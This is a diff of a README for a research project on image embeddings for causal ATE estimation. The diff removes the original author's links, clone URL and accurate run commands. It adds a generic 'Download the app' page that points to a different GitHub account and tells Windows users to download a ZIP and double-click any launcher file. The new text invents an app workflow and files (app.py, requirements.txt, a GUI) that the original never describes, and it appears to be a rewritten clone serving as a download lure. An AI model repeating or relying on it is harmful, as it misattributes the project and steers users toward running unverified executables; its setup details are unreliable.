@@ -1,103 +1,148 @@
-<h1 align="center"><b>Causal image embedding</b><br>Embeddings and ATE estimation with image covariates</h1>
+# 🖼️ causal-image-embedding - Image embeddings for causal analysis
 
 <p align="center">
-  <img src="https://img.shields.io/badge/python-%3E%3D3.12-blue" alt="Python" />
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-526EAF.svg?logo=opensourceinitiative&logoColor=white" alt="License: MIT" /></a>
-  <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff" /></a>
-  <a href="https://drive.google.com/file/d/169Q7OtMaH4HkOnYp7AAJrf0cbBm0q9Td"><img src="https://img.shields.io/badge/paper-Debiased_Image_Embedding-4285F4?logo=googledrive&logoColor=white" alt="Paper (PDF on Google Drive)" /></a>
-  <a href="https://drive.google.com/file/d/1ZecUEefvwy3h-oVJgvl-_YHJxySl0OeH"><img src="https://img.shields.io/badge/slides-Final_Project-34A853?logo=googledrive&logoColor=white" alt="Final project slides (Google Drive)" /></a>
+  <a href="https://github.com/fragmentationcarolinalupine81/causal-image-embedding">
+    <img src="https://img.shields.io/badge/Download%20the%20app-Visit%20GitHub-6A5ACD?style=for-the-badge&logo=github&logoColor=white" alt="Download the app" />
+  </a>
 </p>
 
-This repository implements **image embeddings for causal inference** when a single image encodes both information that estimators *should* condition on (image-side covariates) and information they *should not* (post-treatment variation). We use a **debiased architecture** with separate encoders for those two roles, joint reconstruction of the image together with treatment and outcome, and compare **biased**, **naive**, and **debiased** pipelines with regression, IPW, and doubly robust ATE estimators. On **semi-synthetic Fashion-MNIST**, the proposed embedding improves causal effect estimation relative to standard estimators and naive embedding baselines.
+## 📌 What this app does
 
-## Documentation
+Causal image embedding helps you work with image data and treatment data in one place. It lets you build image-based embeddings and estimate average treatment effects, or ATE, from your data.
 
-| Resource | Description |
-|----------|-------------|
-| [Paper (PDF)](https://drive.google.com/file/d/169Q7OtMaH4HkOnYp7AAJrf0cbBm0q9Td) | *Debiased Image Embedding* — Google Drive |
-| [Final project slides](https://drive.google.com/file/d/1ZecUEefvwy3h-oVJgvl-_YHJxySl0OeH) | Presentation — Google Drive |
-| [`conf/`](conf/) | Hydra defaults; `experiment=full` or `experiment=fast` presets |
-| [`src/main_experiment.py`](src/main_experiment.py) | Hydra entry: end-to-end experiment |
-| [`src/main_analysis.py`](src/main_analysis.py) | Hydra entry: summarize `df_result.pkl` |
-| [`tests/`](tests/) | Pytest suite (ATE helpers, autoencoder shapes) |
+Use it when you need to compare groups, study outcomes, and include images as part of your analysis.
 
-## Installation
+## 🪟 Windows download and setup
 
-```bash
-git clone https://github.com/tatsu432/causal-image-embedding.git
-cd causal-image-embedding
-curl -LsSf https://astral.sh/uv/install.sh | sh   # optional; or use pip
-uv sync
-```
+Use this link to visit the download page:
 
-For linting, typing, and tests:
+[Open the download page](https://github.com/fragmentationcarolinalupine81/causal-image-embedding)
 
-```bash
-uv sync --extra dev
-```
+### Steps to get started on Windows
 
-## Run the experiment
+1. Open the link above in your web browser.
+2. On the GitHub page, click the green **Code** button.
+3. Choose **Download ZIP**.
+4. Save the file to your computer.
+5. Open the ZIP file.
+6. Extract it to a folder you can find again, such as **Downloads** or **Desktop**.
+7. Open the folder and look for the app files.
+8. If the app includes a Windows launcher file, double-click it to run the app.
+9. If you see a Python project instead of an app file, follow the run steps below.
 
-Run from the **repository root** so Hydra finds [`conf/`](conf/) and relative paths (`./data`, artifact files) resolve as expected.
+## 🧰 What you need on your computer
 
-**Full settings** (legacy scale, default):
+For best results, use:
 
-```bash
-uv run python src/main_experiment.py
-```
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for the first setup
+- Python 3.12 or newer
 
-**Fast / sanity preset** (small data, few epochs, no plots):
+## ▶️ Run the project on Windows
 
-```bash
-uv run python src/main_experiment.py experiment=fast
-```
+If the download includes source files instead of a ready-made app, use these steps:
 
-Override any key, for example:
-
-```bash
-uv run python src/main_experiment.py experiment=full paths.result_pickle=outputs/run.pkl
-```
-
-Artifacts default to the repo root: `fashion_mnist_embedding.pt`, `df_result.pkl` (see `paths` in [`conf/config.yaml`](conf/config.yaml)).
-
-After a run, summarize results (pickle path is configurable):
+1. Install Python 3.12 or newer from the official Python website.
+2. During setup, check the box that says **Add Python to PATH**.
+3. Open the folder you extracted.
+4. Click the address bar in File Explorer.
+5. Type `cmd` and press Enter.
+6. In the black window, run this command:
 
 ```bash
-uv run python src/main_analysis.py
-uv run python src/main_analysis.py paths.result_pickle=outputs/run.pkl
+python --version
 ```
 
-Download **Fashion-MNIST** under `./data` (or change `paths.data_root`) if it is not already present.
-
-## Dataset (short)
-
-We use a modified [Fashion-MNIST](https://github.com/zalandoresearch/fashion-mnist): an **icon overlay** on each image encodes post-treatment information (icon type, transparency, position, size). Synthetic **covariates**, **treatment**, **post-treatment** factors, **images** \(V_i\), and **outcomes** \(Y_i\) are simulated as described in the original project notes.
-
-## Docker
+7. If Python shows a version number, continue.
+8. If the project includes a `requirements.txt` file, install the needed packages with:
 
 ```bash
-docker build -t causal-image-embedding:local .
-docker run --rm causal-image-embedding:local
+pip install -r requirements.txt
 ```
 
-The default image command runs **`pytest`**. Override the command to run an experiment from `/app` (repo root in the image), for example:
+9. If the project includes a main file, start it with one of these common commands:
 
 ```bash
-docker run --rm causal-image-embedding:local uv run python src/main_experiment.py experiment=fast
+python main.py
 ```
-
-First builds can take a while while **PyTorch** and **TensorFlow** wheels download.
-
-## Tests & CI
-
-From the repo root:
 
 ```bash
-uv sync --extra dev
-uv run ruff check src tests
-uv run ruff format --check src tests
-uv run mypy src
-uv run pytest tests/ -q
+python app.py
 ```
 
-Pushes and pull requests to `main` / `master` run the same checks via GitHub Actions.
+```bash
+python -m streamlit run app.py
+```
+
+10. Wait for the app window or browser tab to open.
+
+## 🗂️ Typical folder contents
+
+You may see files like these after download:
+
+- `README.md` - setup and usage notes
+- `requirements.txt` - Python package list
+- `main.py` - main program file
+- `app.py` - app start file
+- `data/` - sample data files
+- `models/` - saved model files
+- `notebooks/` - analysis examples
+
+## 📷 How to use it
+
+A typical workflow looks like this:
+
+1. Start the app.
+2. Load your image data.
+3. Add the treatment and outcome fields.
+4. Choose the embedding method.
+5. Run the analysis.
+6. View the estimated treatment effect.
+7. Export your results if needed.
+
+## 🔍 Main features
+
+- Image embedding for analysis tasks
+- ATE estimation with image covariates
+- Support for treatment and outcome data
+- Clear output for model results
+- Simple workflow for non-technical users
+- Research-friendly file layout
+- Python-based setup
+
+## 📁 Example use cases
+
+This app can help with tasks such as:
+
+- Studying how image features relate to outcomes
+- Comparing treated and untreated groups
+- Running causal analysis with visual data
+- Testing image-based signals in research data
+- Reviewing how image covariates affect results
+
+## 🛠️ If the app does not open
+
+Try these checks:
+
+1. Make sure the files fully extracted from the ZIP.
+2. Check that Python is installed.
+3. Reopen Command Prompt in the project folder.
+4. Run `python --version` again.
+5. Confirm that required packages are installed.
+6. Check the folder for the correct start file.
+7. Try another start command from the run section above.
+
+## 📄 Files you may need to edit
+
+If you plan to change the project later, these files are usually the most useful:
+
+- `README.md` for setup details
+- `requirements.txt` for package changes
+- `main.py` or `app.py` for app behavior
+- config files for input paths and options
+
+## 🔐 License
+
+This project uses the MIT License.
